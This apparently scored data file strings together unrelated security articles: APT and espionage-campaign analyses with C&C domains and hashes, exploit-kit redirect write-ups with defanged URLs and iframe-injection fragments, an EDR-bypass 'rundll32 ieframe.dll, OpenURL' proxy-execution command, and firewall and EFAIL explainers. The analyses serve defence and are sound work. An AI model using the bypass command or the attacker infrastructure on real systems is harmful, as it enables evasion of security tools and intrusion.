"The actor only used a simple XOR function to encrypt the data that is uploaded. After decrypting the token by reversing RAT samples, we were able to access the full data with at least 3GB uncompressed file size. Most of the data consists of documents relating to the logged in user or data of installed programs.",0.010481962674860235
Figure 22: We were able to access the full data.,0.012313339648501342
"We discovered that the actor used another cloud storage service, named JianGuoYun, in its recent activity, which was used for tests and exfiltration.",0.019132807190838097
Figure 23: The actor recently used another cloud storage service named JianGuoYun.,0.022473824921414587
"Besides the data we mentioned, the actor also collects information about the target PC. The RATs collected information from the victim PC, including OS, process list, IP address, host name, user name, and so on.",0.022171944518217468
Attribution of the actor,0.008065999682203784
"Attribution is always a problem for the security investigator. For the PoisonVine group, we found several pieces of evidence which could help identify the actor, including language, encoding and character set. We found several cases of metadata written in Traditional Chinese in the payloads.",0.016020189154228537
Figure 24: We found several cses of metadata written in Traditional Chinese in payloads.,0.016902615329166704
"The default character set in the decoy document is ‘PMingLiU’, which is used most commonly in the Traditional Chinese-speaking regions. And most of the names of the decoy documents related to cross-strait relations in China.",0.011084197754334446
Figure 25: The default character set in the decoy document is ‘PMingLiU’.,0.012788726688359509
"The Whois information for one of the C&C domains (javainfo.upgrinfo.com) is shown in Figure 26. The registrant address is in Taiwan, New Taipei. And the registrant name may use the Wade–Giles romanization system.",0.011683765123819523
Figure 26: Whois information for javainfo.upgrinfo.com.,0.013583061351245429
Conclusion,0.008171308922719556
"Geopolitics is always a major motivation of a cyberespionage threat. Based on the techniques it uses, we believe that the PoisonVine group isn’t a sophisticated APT group. However, it has been active for 11 years and remains active. Furthermore, the group’s purpose is to collect intelligence regarding national defence, military, government, science and technology, education and so on.",0.01485345389132875
Acknowledgement,0.009608660438509165
"We acknowledge the 360 Core Security Team from Qihoo 360 for their cooperation in the analysis of and report on the PoisonVine group, as well as the English version of the report [2, 9].",0.011736978190555525
References,0.0158494738281566
[1] APT Group (APT-C-01) New Utilization Vulnerability Sample Analysis and Association Mining (in Chinese). 360 Threat Intelligence Center. https://ti.qianxin.com/blog/articles/analysis-of-apt-c-01/.,0.01228509615547746
[2] APT-C-01. https://ti.qianxin.com/uploads/2018/09/20/6f8ad451646c9eda1f75c5d31f39f668.pdf.,0.011461049894076591
[3] http://www.isightpartners.com/2014/10/cve-2014-4114/.,0.012186134799816006
[4] Kanbox. https://kanbox.com/.,0.012478218507832817
[5] RedDrip Team. https://twitter.com/RedDrip7/status/1118009381679878144.,0.01304775947235326
[6] Jianguoyun. https://www.jianguoyun.com/.,0.012504039812182732
[7] POISON IVY: Assessing Damage and Extracting Intelligence. https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf.,0.01166605643880736
"[8] Allievi, A.; Goddard, D.; Hurley, S.; Zidouemba, A. Threat Spotlight: Group 72, Opening the ZxShell https://blogs.cisco.com/security/talos/opening-zxshell.",0.01762163949751472
"[9] Poison Ivy Group and the Cyberespionage Campaign Against Chinese Military and Goverment. http://blogs.360.cn/post/APT_C_01_en.html.
",0.014641485574788726
"Targeted information stealing attacks in South Asia use email, signed binaries
Detailed analysis of a targeted campaign that tries to steal sensitive information from different organizations throughout the world, but particularly in Pakistan.",0.018314460400134513
16 May 2013 - 10:15AM,0.011106853773941383
"Detailed analysis of a targeted campaign that tries to steal sensitive information from different organizations throughout the world, but particularly in Pakistan.",0.019460756250678335
[Update: Norman released a comprehensive white paper profiling the group behind these attacks],0.009162949111886975
"In the past few months, we have analyzed a targeted campaign that tries to steal sensitive information from different organizations throughout the world, but particularly in Pakistan. During the course of our investigations we uncovered several leads that indicate this threat has its origin in India and has been going on for at least two years. The journey began with a code-signing certificate and an exploit and the scope of the investigation has widened ever since. In this blog post, we will highlight several interesting artifacts of the campaign, but more will be revealed in my upcoming presentation at the 7th International CARO Workshop in mid-May.",0.012610773041227374
Code signing certificate,0.007975108584930446
"For part of this campaign a code signing certificate was used to sign malicious binaries and improve their potential to spread. This certificate was issued in late 2011 to an Indian company called Technical and Commercial Consulting Pvt. Ltd., based in New Delhi.",0.010953823474084579
"When we started our investigation, the certificate had been revoked for files signed after March 31st 2012. We contacted VeriSign with evidence that this certificate had been used maliciously since it was issued and they promptly revoked the certificate unconditionally. Overall, we found more than 70 signed malicious binaries using this certificate. Since each signed sample comes with an authoritative timestamp, it is possible to draw a timeline depicting when these binaries were produced:",0.012373654144152257
Figure 1 Timeline of signing times. Black lines represent one sample signing time,0.01325310205925001
"From the information we gathered, the attackers were actively signing malicious binaries from March until June 2012. Then, there is a gap in the timeline, from the beginning of July until the beginning of August 2012. We then see another spike in certificate usage (even though it had already been revoked) in August and September 2012. There are several possible explanations as to why there is a gap during the summer of 2012, but it is likely that this was the off-season for both the attackers and their targets.",0.016026688841011105
"Although the investigation started with this code signing certificate, we then discovered several similar unsigned samples that were used in this campaign. Some of them were collected as far back as early 2011.",0.012340112564339756
Droppers and decoy documents,0.00898113030652059
"The first infection vector we saw was using the famous CVE-2012-0158 vulnerability. This vulnerability can be exploited by a specially crafted Microsoft Office documents and allows arbitrary code execution. In the case we analyzed, a two-stage shellcode is executed when the user opens an RTF document. First, the shellcode sends information about the system to the domain feds.comule.com and then downloads a malicious binary from digitalapp.org.",0.012688044201476179
"The other infection vector we found used PE files disguised as Microsoft Word or PDF documents, most likely distributed through email. When the user executes the file, the malicious program downloads and executes additional malicious binaries (more on these executables below). To evade suspicion by the victim, a decoy Word document is shown to the user. We have identified several different documents that followed different themes.",0.020138194646093233
"One of these themes is the Indian armed forces. We do not have inside information as to which individuals or organizations were really targeted by these files. However, based on our detection metrics, it is our assumption that people and institutions in Pakistan were targeted.",0.013683317980099474
The text in this first document seems to be a collage of various sources. The fake PDF document was delivered through a self-extracting archive called “pakistandefencetoindiantopmiltrysecreat.exe”:,0.010112298708373602
This other PDF document was delivered through an executable called “pakterrisiomforindian.exe”:,0.008161663013771525
"In this case, the text comes from the Asian Defence blog, a blog aggregating Asian military news. Our telemetry data shows that this file was first seen in August 2011 on a system in Pakistan.",0.012444277075045918
Payloads,0.008060356002808966
"We found many different types of payloads installed by the droppers, all of them were geared towards exfiltrating data from an infected computer to the attackers’ servers. The following table groups the binaries in different families and details their general characteristics.",0.014959026861579239
"Category
Description",0.008963242487310952
"Downloader
Downloads executables from C&C and executes them.",0.01533219930282581
"Document uploader
Searches and uploads documents (csv, pdf, doc, docx, xlsx, etc) found in the trash and in the “My Documents” folder.",0.015663043848666458
"System information gathering
Sends information about the infected system to the C&C using GET requests. It uses WMI to gather information on the infected system such as: Antivirus installed on machine; OS version; Presence of files to upload",0.01216523564385752
"Keylogger
Records keystrokes and sends log to attacker server using POST requests.",0.013227997568360128
"Screenshot
Takes a screenshot of the desktop and sends it to the C&C.",0.011837321781898669
"Connect-back shell
Continually tries to connect back to an hardcoded IP address and allows the attacker to open a remote command shell.",0.007736232669717569
"Public Tools
We found two public tools (WebPassView and Mail PassView) from NirSoft and signed by the malicious certificate. These legitimate tools can be used to recover passwords used in email clients or stored in browsers.",0.011181121666169913
"Self-replication through removable drives
Monitors removable drive insertion events and copies different malware files to the inserted drive. It tries to lure the user into executing one of the copied files by renaming it with an existing folder name and hiding the latter.",0.010751896709240372
The information stolen from an infected computer is uploaded to the attacker’s server unencrypted. The decision not to use encryption is puzzling considering that adding basic encryption would be easy and provide additional stealth to the operation. The screenshot below shows a typical keylogger log:,0.010239797900883252
"The logs are very verbose and display the active window, the characters typed and the special keys in brackets. Since these logs are sent unencrypted, it is easy to detect the presence of an infected machine on your network by examining your HTTP network traffic.",0.013442293385623971
"In terms of persistence, many binaries we have analyzed add an entry in the Windows startup menu with a deceptive name. The screen shot below shows an example of such a startup menu:",0.011373822035211978
"While this technique allows the different components of the attack to be launched after each system reboot, it cannot be labelled as stealthy. Since targeted attacks usually try to stay under the radar as long as possible, we were surprised to see this technique used in this case.",0.01103358116258657
C&C infrastructure,0.009172671820856904
"Most of the analyzed binaries contain a URL from which additional components are downloaded or to which an infected system’s content is uploaded. Sometimes, the C&C URL appears unencrypted in the binary. Other times, it is trivially encoded using a simple one-character rotation (ROT-1) as depicted below:",0.011191461578235695
“gjmftbttpdjbuf/ofu” encrypted to “filesassociate.net”,0.00897013679164893
1,0.011966970221767848
“gjmftbttpdjbuf/ofu” encrypted to “filesassociate.net”,0.00897013679164893
"We uncovered more than 20 domains linked to this campaign. While some still had an active DNS record, most of them did not resolve to an IP address. Using historical data around these domains, we were able to discover where these sites were hosted. It turns out that almost a third of all domains were hosted by OVH. This web hosting service has a reputation for hosting malware and spam content. In a recent HOSTExploit report it was ranked number 5 in the top 50 hosts for concentration of malicious activity served from an Autonomous System.",0.011331319571446952
Most of the domain names are very close to real site or company names. This is a common tactic to try to conceal the true purpose of the C&C server. Two examples are “wearwellgarments.eu” and “secuina.com”. The former is very close to a real website called “wearwellgarments.com” while the latter looks like a misspelling of information security firm Secunia.,0.011639015036158162
Origins of the malicious files,0.008175087028619576
"Analyzing this campaign allowed us to identify a few key indicators pointing to the geographic origin of these malicious files. We believe they all come from India. First, the code signing certificate was issued to an Indian company. In addition, all the signing timestamps are between 5:06 and 13:45 UTC, which is consistent with 8-hour work shifts falling between 10:36 and 19:15 in Indian Standard Time. This might seem a bit late, but considering that signing the binary is the last step in the development effort, it is likely that the malware authors were living in this time zone.",0.014385860818802332
"We also found several strings in the binaries that are related to Indian culture. In several scripts, a variable called ramukaka is used:",0.015166131699527186
"Ramu Kaka is a typical Bollywood-style servant in a house. Considering that this variable is responsible for achieving persistence on the system, this definition is a good fit.",0.010904568515114677
"The most compelling argument is found in our telemetry data. We found that many malware variants tied to this campaign appeared in the same location over a very small period of time. Each variant had only minor differences from each other, strongly suggesting an attempt by a malware creator to evade detection by our product. These files all appeared in the same region of India.",0.012753180038641898
Infection statistics,0.009254893382279916
Our telemetry data shows that Pakistan is heavily affected by this campaign. The following graph shows the detection distribution we have observed for all the malicious files we linked to this campaign in the last two years.,0.015228966272306188
"Thanks to our sinkholing of three domain names used by this campaign, we were also able to gather statistics on the geographical location of infected hosts.",0.01684811077017212
"As one can see, the regional distribution presented in the last two graphs is very different. Ukraine and Kazakhstan account for three quarters of all IP addresses seen during the sinkholing operation. This difference can be explained by the possibility that unique domains are only for specific sub-operation in this campaign. If that was the case, the sinkhole data we are seeing would only be a very partial view of the whole campaign.",0.01912202290174192
Conclusion,0.008171308922719556
"This post examined evidence of a far-reaching targeted campaign aimed at different targets throughout the world. Our analysis indicates that the entire campaign originates from India. Although we have seen a number of infections throughout the world, it seems that the most prominent target is Pakistan. Targeted attacks are all too common these days, but this one is certainly noteworthy for its failure to employ advanced tools to conduct its campaigns. String obfuscation using simple rotation (a shift cipher), no cryptography used in network communication, persistence achieved through the startup menu and use of existing, publicly-available tools to gather information on infected systems shows that the attackers did not go to great lengths to cover their tracks. On the other hand, maybe they see no need to implement stealthier techniques because the simple ways still work.",0.012528232976734222
SHA1 Hashes,0.01104286590290604
"CVE-2012-0158 RTF Document:                  3b1d9d65159bea24ab1060e5603f9e3c2d38d08d
pakterrisiomforindian.exe:                   d859f1cf99049f89258c1faa59dcd97f587e45ac
pakistandefencetoindiantopmiltrysecreat.exe: 1db89237ef786c7f22a8d4cd7eccda8f6286a6de
Downloader:                                  08ce405f0a0277de355454862b164ffd94a7ea36
Document uploader:                           DB22E7DEA0C1CAF203072693485DE4E4FD2CB56A
System information gathering:                0D610F3F51750EADCF426E10E6DE5313605400FA
Keylogger:                                   AE7B9CFB10CD65B98C59DC012D6726B66BE92897
Screenshot:                                  A0DD0B8FD0C98E917BFDC96182088CAB5505CCD2
Connect-back shell:                          09D4ECA67B1D071E57C5951D97FE9DD9C62F1580
Self-replication through removable drives:   20A29D1F89C07BAFBB4C61CE208531D68125C8E",0.011085225821093614
12345678910,0.008725552767522293
CVE-2012-0158 RTF Document:                  3b1d9d65159bea24ab1060e5603f9e3c2d38d08dpakterrisiomforindian.exe:                   d859f1cf99049f89258c1faa59dcd97f587e45acpakistandefencetoindiantopmiltrysecreat.exe: 1db89237ef786c7f22a8d4cd7eccda8f6286a6deDownloader:                                  08ce405f0a0277de355454862b164ffd94a7ea36Document uploader:                           DB22E7DEA0C1CAF203072693485DE4E4FD2CB56ASystem information gathering:                0D610F3F51750EADCF426E10E6DE5313605400FAKeylogger:                                   AE7B9CFB10CD65B98C59DC012D6726B66BE92897Screenshot:                                  A0DD0B8FD0C98E917BFDC96182088CAB5505CCD2Connect-back shell:                          09D4ECA67B1D071E57C5951D97FE9DD9C62F1580Self-replication through removable drives:   20A29D1F89C07BAFBB4C61CE208531D68125C8E,0.012950301798128061
Detection Names,0.010753995385640813
Below are ESET threat names related to this case:,0.008703212260017912
"Win32/Agent.NLD worm
Win32/Spy.Agent.NZD trojan
Win32/Spy.Agent.OBF trojan
Win32/Spy.Agent.OBV trojan
Win32/Spy.KeyLogger.NZL trojan
Win32/Spy.KeyLogger.NZN trojan
Win32/Spy.VB.NOF trojan
Win32/Spy.VB.NRP trojan
Win32/TrojanDownloader.Agent.RNT trojan
Win32/TrojanDownloader.Agent.RNV trojan
Win32/TrojanDownloader.Agent.RNW trojan
Win32/VB.NTC trojan
Win32/VB.NVM trojan
Win32/VB.NWB trojan
Win32/VB.QPK trojan
Win32/VB.QTV trojan
Win32/VB.QTY trojan
Win32/Spy.Agent.NVL trojan
Win32/Spy.Agent.OAZ trojan",0.03212711970226123
12345678910111213141516171819,0.009418498588891433
"Win32/Agent.NLD wormWin32/Spy.Agent.NZD trojanWin32/Spy.Agent.OBF trojanWin32/Spy.Agent.OBV trojanWin32/Spy.KeyLogger.NZL trojanWin32/Spy.KeyLogger.NZN trojanWin32/Spy.VB.NOF trojanWin32/Spy.VB.NRP trojanWin32/TrojanDownloader.Agent.RNT trojanWin32/TrojanDownloader.Agent.RNV trojanWin32/TrojanDownloader.Agent.RNW trojanWin32/VB.NTC trojanWin32/VB.NVM trojanWin32/VB.NWB trojanWin32/VB.QPK trojanWin32/VB.QTV trojanWin32/VB.QTY trojanWin32/Spy.Agent.NVL trojanWin32/Spy.Agent.OAZ trojan
",0.03306801554818706
"Deceiving cPanel ‘Account Suspended’ page serves exploits
cPanel is one of the most popular web hosting control panels out there. It allows administrators to manage their website(s) using a graphical front end, perform maintenance and review important logs among other things.
cPanel also has a user interface for CGI (short for Common Gateway Interface) typically used to run scripts and generate dynamic content.
One such script populates a fairly well-known (and somewhat dreaded) page known as the “Account Suspended” page:",0.012620722018102715
"Visitors to a site are redirected to this screen for one of many reasons ranging from the site owner’s failure to pay for his hosting, violating the Terms and Conditions, or perhaps exceeding their allocated bandwidth.
The script that loads this page is located here:
/usr/local/cpanel/cgi-sys/suspendedpage.cgi
The page itself is made of HTML code, and can be edited by an administrator, often via a Web Host Manager (WHM).
Many sites that were once used to distribute malware and have been suspended will sport that kind of page. One would assume that the site would now be harmless, since the hosting provider has already taken action.
If you aren’t looking at the URL carefully (the suspended page should be displayed at the root of the domain) and assumed so, you might just run into a case where the site is actually fully compromised and still active.
Here’s such an example we ran across where hackers compromised a site and injected malicious code within a seemingly innocent-looking “Account Suspended” page.
Looking at the HTML source code, we can spot an iframe which points to an exploit kit URL:",0.010898126833680077
"The URL shown above (osuavope.servepics.com) is dynamically generated and changes every so often to defeat basic blacklisting.
For example, if you revisit the page from a different IP address at some later time you will get a brand new URL:",0.010236272268545177
"The iframe width and height parameters are also different each time again in an effort to defeat signature based security scanners.
So much for a dormant site, eh?
Fiesta exploit kit
hxxp://osuavope.servepics.com/s77zj9fa1kcmnsjv0vwlqaag3xt5esr23fmf
hxxp://osuavope.servepics.com/j_86zfsy/29ae1d7536720ab60600565e045f04020509595e0506070e070d040104050404;115502;146
hxxp://osuavope.servepics.com/j_86zfsy/5916508f634754484655470d000b0b510209090d0152085d000d545200510b57;5110411
hxxp://osuavope.servepics.com/j_86zfsy/68f749bb9140b2ba5a51040c0102515501085e0c005b5259030c035301585153;930
hxxp://osuavope.servepics.com/j_86zfsy/7b3824179c7604c45d0c5f03070f020000520b030656010c0256565c07550206
hxxp://osuavope.servepics.com/j_86zfsy/59141fffa1f159305a56530f045d55510209090f0504565d000d545004075505
hxxp://osuavope.servepics.com/j_86zfsy/7d95beaa8d8debab541c5c0e575e52560054010e5607515a02505c5157045250;1;3",0.015213514386130167
"The injected iframe redirects straight to a Fiesta exploit kit landing page. The landing page usually performs various checks and prepares the exploits that are going to get fired at the victim.
As is often the case with exploit kits, that page is heavily obfuscated to make identification a little bit more difficult:",0.009715429465340208
"The landing page calls multiple exploits, although in theory only one of them is really necessary to compromise a system.",0.013730180965624394
"Flash exploit (VT): CVE-2015-0311
Silverlight exploit (VT): CVE-2013-0074
PDF exploit (VT): CVE-2010-0188
Java exploit (VT): CVE-2013-2465",0.011203848456668442
Malwarebytes Anti-Exploit blocks this attack with all of the exploits thrown at it:,0.008290020128734477
"Malwarebytes Anti-Malware detects Trojan.Agent.DED and also protects vulnerable users who are infected with this nasty Trojan (VirusTotal link).
This case is a reminder not to trust a book by its cover and always exercise caution. Attackers were clever to hide the malicious redirect code where they did because they might trick someone into brushing off the site as “already terminated by the hosting provider”, when in fact it’s not.
They might have fooled some, but they didn’t fool us.
",0.01474879628563286
"A cunning way to deliver malware
Potentially unwanted programs, also known as PUPs, continue to be a real nuisance. A recent blog post by Will Dormann on CERT.org shows the prevalence of such applications lurking on every corner of the web: search engines results, software portals, popups, ads, etc.
Deceptive tactics
Here is an example of an unwanted warning pushed as a pop-up:",0.016826311090570645
"The text reads: “UPDATED RECOMMENDED! It is recommended that you install the software to ensure your browser is the latest version. Please update to continue.”
The following page shows that our browser (Internet Explorer) may be out of date and urges us to download a program to check for outdated software.",0.008995934133569805
"It is worth noting that this webpage was totally unsolicited and is in fact very misleading. The disclaimer hiding at the bottom of the page reveals more about what this is all about:
“UpdateNowPro.com is distributing Software Updater. Air Installer is an install manager that will manage the installation of the selected software. In addition to managing the installation of your selected software, this install manager will make recommendations for additional free software that you may be interested in. Additional software may include toolbars, browser add-ons, game applications, anti-virus applications and other types of applications. You are not required to install any additional software to receive your selected software. You can completely remove the program at any time in Windows ‘Add/Remove Programs’. At the time of downloading you accept the Terms and Privacy Policy.”
In other words, the program they want you to download bundles other applications, something we know all too well.
Attempting to close the page brings up yet another warning:",0.01563940432132105
"We could argue with advertisers that these practices are not okay until we are blue in the face. But here’s the catch with this one: while the page is saying our system could be at risk we are silently being infected with a drive-by download!
From PUP to exploit kit
The following Fiddler (web debugger) capture was recorded on: 2014-06-30 18:30 PT. It shows how bad guys leverage large infrastructures to hide malicious redirections behind potentially unwanted programs.",0.010156935755314511
"hxxp://rvzr-a.akamaihd.net/sd/apps/fusionx/0.0.4.html?aff=1700-1043
hxxp://www.likemagicbox.com/fusionx/www/delivery/afr.php?zoneid=486&cb=6065978317
hxxp://classic.flowershopprescott.com/assets/js/jquery-1.3.1.min.js?ver=1.27.8660
hxxp://draft.traveltube.biz/d36c829bovoym7.html
Some users are getting redirected to an exploit kit while at the same time receiving the same software update page. This is a very sneaky attack involving many actors with rotating domain names for harder identification (click to enlarge):",0.009603690677831733
"The domain likemagicbox.com illustrated in this case was registered on 2014-06-30, the same day it started being used in this malware campaign: this is no simple coincidence!
Traffic analysis
The first URL on akamaihd.net has an external JavaScript inclusion:",0.00885195109603909
"The JavaScript contains a convoluted variable that has various identifiers corresponding to the type of ad and the geolocation of the visitor. More importantly, we see the iFrame redirecting to an abused/complicit server:",0.011562149451718073
"Once on this URL there are a couple different ad redirections (note the Yahoo advert too!). And there is this interesting code snippet:
if(document.cookie.indexOf(""_epel"")==-1){var page_object=document.createElement(""iframe"");
This checks the user’s computer for a cookie called _epel and only if it does not exist will it allow the creation of a secondary (malicious) iframe. To prevent the same user from getting redirected to it again, another little piece of code creates the aforementioned cookie before exiting:
document.cookie = ""_epel=readed;",0.015448290840323842
"This dynamically created iframe is rotated every hour using a simple sub-domain generation algorithm (DGA) with alphabetically sorted keywords:
URL,Date,Registrant
co.TOASTEDROOSTERCAFE.COM,Thu Jul 3 13:04,Robert Maynard
coa.TOASTEDROOSTERCAFE.NET,Thu Jul 3 14:03,Robert Maynard
coas.TOASTGUYS.COM,Thu Jul 3 15:04,Robert Maynard
coach.TOASTHOUSE.COM,Thu Jul 3 16:06,?
coaches.TOASTHOUSEMARKET.COM,Thu Jul 3 17:02,Robert Maynard
coaching.TOASTKITCHEN.COM,Thu Jul 3 18:17,Robert Maynard
coal.TOASTMARKET.COM,Thu Jul 3 19:22,Robert Maynard
coals.TSTKITCHEN.COM,Thu Jul 3 20:12,?
coast.2NDAMENDMENTVOTERS.COM,Thu Jul 3 21:07,?
coastal.2NDAMENDMENTVOTERS.ORG,Thu Jul 3 22:02,?
coat.AIMINSINC.INFO,Thu Jul 3 23:07,Kurt Grashaw
coating.AMERICANBROTHERSINARM.COM,Fri Jul 4 00:07,Kurt Grashaw
coatings.ANALEHSHOW.COM,Fri Jul 4 01:12,Kurt Grashaw
cobra.CCNAXUSCONSTRUCTION.COM,Fri Jul 4 02:02,Kurt Grashaw
coc.GRANBYSOCCER.COM,Fri Jul 4 03:12,Kurt Grashaw
cock.LOOKINGTOVOLUNTEER.ORG,Fri Jul 4 04:02,Kurt Grashaw
Many of these root domains belong to the same persons. The bad guys are enumerating compromised accounts and hijacking their DNS records.
Malicious iframes are inserted within jquery (a very popular JavaScript library) files such as:
{subdomain.domain}/assets/js/jquery-1.3.1.min.js?ver=1.27.8660
After the URL has been used for an hour, it is discarded and the subdomain no longer responds.",0.013648042695838525
You may have recognized the URL for the landing page of the Nuclear Pack exploit kit:,0.007494196566964817
The page loads a Java exploit (CVE-2013-2465?):,0.009225336183475208
and a Flash exploit (CVE-2014-0515?):,0.009769266786373798
"two malware payloads are subsequently dropped (#1, #2) detected as Spyware.Zbot.VXGen by Malwarebytes Anti-Malware.
Parting thoughts
Earlier recorded events with a similar redirection method date back to May 2014 as documented in this security blog.
Malwarebytes is tough on PUPs and we show no mercy for exploits or malware.
We have reported this incident to Akamai’s Abuse department so that they can take immediate action against these bad actors.
@jeromesegura
",0.011288728117295532
"Running programs via Proxy & jumping on a EDR-bypass trampoline, Part 5
March 15, 2018 in Anti-*, EDR, Living off the land, LOLBins",0.0113379764131456
"Update
After I posted it bohops provided one more variant:
rundll32.exe shdocvw.dll, OpenURL [path to file.url]
Thanks!
Old Post
This is nothing new, but just documenting for the sake of documenting.
It crossed my mind to look for all the DLLs that refer to OpenURL – an API that is exported by the url.dll – which is used to launch URLs (and was a subject of the first part of the series). I quickly discovered that ieframe.dll also exports identically named function; a quick googling around followed and I noticed it was a subject to previous analysis (CVE-2016-3353) – as a result, the vulnerability that allowed remote execution of code was patched.
Still, the built-in functionality can help to launch other programs via proxy e.g. using the .url file:
[InternetShortcut]
URL=file:///c:\windows\system32\calc.exe
and running:
rundll32 ieframe.dll, OpenURL <path to local URL file>
will launch calculator.",0.008587937692504877
"Comments Off on Running programs via Proxy & jumping on a EDR-bypass trampoline, Part 5",0.008844418460179027
"Comments are closed.
",0.01623942207169282
The problem with next-gen firewall protection,0.007180138699485639
Products & Services•Firewall•network•XG Firewall•XG Firewall v17,0.008427158720993422
"You expected a symphony orchestra, not a one-man-band.",0.017134202799302445
"January 01, 2018
Written by
Chris McCormack",0.01089526081216241
PRODUCTS & SERVICES,0.010734820384793453
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"Modern, next-gen firewalls are purpose built to defend against outbreaks like WannaCry and NotPetya, but both these worms went global, spreading unchecked through too many corporate networks.
Along the way some organisations discovered an uncomfortable truth: that next-gen protection can be less than the sum of its parts because of network protection that falls short, poor deployment or overly-complex configuration and management.
In my recent article the problem with firewalls I explained why, for many network administrators, firewalls aren’t the trusted enforcers they once were. In this article I focus in on the way that next-generation protection features are letting some admins down, and what can be done about it.
How WannaCry and NotPetya spread
Companies typically rely on a number of common services for their network functionality. If vulnerabilities in those services are successfully exploited it can have dire consequences.
The WannaCry and NotPetya outbreaks spread to more than 150 countries, running through corporate networks, encrypting computers and crippling businesses as they went. They spread, worm-like, from network to network using the EternalBlue exploit that allows remote code execution on Microsoft Windows SMB services harboring the CVE-2017-0144 vulnerability.
The SMB protocol is ubiquitous on corporate LANs and allows computers to discover each other for the purpose of sharing files and other resources like printers. It can also be used for file sharing outside the corporate network if the necessary ports are opened or forwarded on the firewall.
Microsoft had issued patches for EternalBlue before the outbreaks but the attack occurred before many systems had been updated.
Rolling patches out across organizations can be a considerable undertaking and the window of opportunity for attackers doesn’t close when a patch becomes available, it’s open until a patch is deployed.
So how can you protect your network from attacks like these, and if an attack does penetrate your network how can you prevent it from propagating or moving laterally?
Enter, next-gen protection.
Why next-gen protection is important
Ransomware typically enters a network and spreads in one of a few different ways:",0.012161819450417166
"By exploiting a network or system vulnerability
Via fake, compromised or drive-by downloads
On a USB stick or other storage device
In email attachments or phishing links",0.007593904657869355
"Blocking network exploits
IPS (Intrusion Prevention System) technology is a critical component of next-gen firewalls. It uses deep packet inspection to search network traffic for specific exploits, or patterns and anomalies that might indicate an attack.
As with the EternalBlue exploit leveraged by WannaCry and NotPetya, attacks typically use malicious inputs to compromise a host application or service, with the intention of gaining sufficient control to execute code such as ransomware.
Blocking file-based payloads
While WannaCry and NotPetya spread like worms, many ransomware variants attempt to gain entry into networks through phishing emails, spam or web downloads. These attacks typically use social engineering tactics to deliver Microsoft Office documents, PDFs or executables containing malware.
Hackers have become increasingly adept at smuggling this kind of malicious content past traditional, signature-based antivirus detection, making sandboxing an essential component of web filtering and email gateway technology.
Fortunately, cloud-based sandboxing doesn’t normally require any additional hardware or software. Web and email protection engines can identify suspect files at the gateway and send them to a safe sandboxing infrastructure in the cloud to detonate active content and monitor its behavior.
Why next-gen protection fails (and why it doesn’t have to)
1. Poor performance
All network protection solutions are not created equal.
The effectiveness of different firewalls’ IPS engines varies wildly: some have been shown to block more than 90% of vulnerabilities, exploits, and evasion techniques thrown at them while others achieve scores as low as 25%.
Some firewalls also offer a poor cost per protected Mbps and have an unacceptable impact on network performance.
Fortunately, independent test organizations like NSS Labs test all major firewall vendors’ security effectiveness and performance thoroughly, every year. To see which firewalls offer the best security effectiveness and price-performance, download the NSS Labs test report.
2. Cumbersome setup
Modern firewalls do a terrible job of integrating their different protection technologies. If each technology were a  musical instrument then most firewalls would sound like a one-man band falling down the stairs. Individually the instruments are all making a sound but the overall effect is a cacophony.
Setting up proper next-gen firewall protection typically means individually configuring firewall rules, application control, TLS inspection, sandboxing, web filtering, antivirus and IPS.
If you ever want to determine what protection is applied (or modify it) you’ll need to go back and revisit each of these seven different areas. Needless to say, this level of complexity makes it very difficult to determine if optimal protection is being applied to any given set of users or type of traffic.
It’s complex, it’s tedious, it’s risky and it doesn’t have to be this way.
To see an elegant solution to this problem, and how you can configure all the protection you need easily, on a single screen, with a complete view of your security posture, download the XG Firewall Solution Brief.
3. Ineffective deployment
Protection technologies like IPS and sandboxing are only effective when traffic is actually traversing the firewall and there are suitable enforcement and protection policies applied to the firewall rules governing that traffic.
In other words, how you segment your network and deploy your firewall will have an enormous influence on the level of protection it provides in the real world.
To learn more about firewall deployment best practices for blocking the latest threats, download our white paper on firewall best practices.
",0.018773748418777325
The EFAIL OpenPGP & S/MIME vulnerabilities,0.008869213758314842
"Those who follow the security news could hardly have missed the release of the ‘EFAIL’ vulnerabilities this week. In brief, issues have been found with OpenPGP and S/MIME email encryption which can potentially expose the decrypted text of a message to attackers.",0.012328363925435015
"What are PGP and S/MIME?
The authors of the EFAIL paper cover this well, but ultimately email is a plaintext communication medium – much like the majority of pen and paper letters outside of spy films – and PGP and S/MIME are methods of encrypting the content of these messages.
It should be noted at this point that PGP and S/MIME serve a different purpose to TLS. The latter is a method of securing data in transit: when the email arrives on the recipient’s machine it is no longer encrypted. PGP and S/MIME, on the other hand, secure the data at rest (and, as a by-product, provide an additional layer of security in transit). This is particularly desirable for anyone who is concerned about the security of their communications should, for example, their laptop be stolen – S/MIME is often used in enterprises for this very reason.
The EFAIL vulnerabilities
The full details of EFAIL are naturally provided by the authors, but the two variants both look at ‘tricking’ an email client into revealing the decrypted text of a message.
Separate CVE numbers have been assigned for the gadget attacks against OpenPGP (CVE-2017-17688) and S/MIME (CVE-2017-17689).
Direct exfiltration
The first vulnerability involves wrapping the encrypted text in a malformed HTML image tag. After the email client has decrypted the email, the blob of decrypted content sits inside the source URL section of the tag, resulting in the client making a request to a domain containing the entire decrypted text – assuming the attacker controls the server receiving the request, they now have the full message (or at least the important bit) in plain text.
While this variant affects the popular Apple Mail and Mozilla Thunderbird clients, the good news is that it is theoretically fixable by patching the email clients.
CBC/CFB gadget attack
The second variant is rather more technical and effectively relies on the combination of the known format of S/MIME emails in particular with block cipher techniques although again, at the end of the day, the goal again is to insert a malformed tag to trick the client into making an HTTP request containing the plain text of the message.
This variant is reportedly more effective against S/MIME than PGP encryption, but unfortunately should work against any standard-compliant email client.
Protection & mitigation
It is worth noting that in both cases someone needs to intercept your email to carry out the attack. This significantly reduces the likelihood of EFAIL becoming widespread, although for ‘high value’ targets such as politicians, journalists, etc. the risk is still serious.
Naturally, we recommend applying any vendor patches which may be released to counter these vulnerabilities as soon as they become available. In the meantime, there are steps that can be taken to attempt to minimise risk:
Disable HTML Email – Frequently recommended by the security industry, disabling the rendering of HTML email will prevent your email client from parsing image links (among other things). While this doesn’t guarantee safety, it removes many potential avenues of attack within email content. Note that this is specifically disabling the viewing of HTML email which you have received, as opposed to simply changing the default format in which you write and send messages.
Disable automatic decryption in your email client – Note that this does not mean stopping the use of PGP or S/MIME. It simply means that your email client no longer handles the decryption for you. The EFF provide details on how to take this step in Thunderbird, Apple Mail, and iOS Mail.
